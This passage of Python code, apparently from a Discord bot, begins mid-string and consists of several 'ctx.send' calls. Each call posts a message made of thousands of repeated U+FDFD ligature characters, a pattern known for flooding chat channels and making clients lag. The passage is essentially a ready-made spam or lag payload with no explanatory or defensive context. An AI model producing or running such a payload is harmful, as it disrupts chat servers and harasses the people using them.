﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽")
        await ctx.send("﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽")
        await ctx.send("﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽")
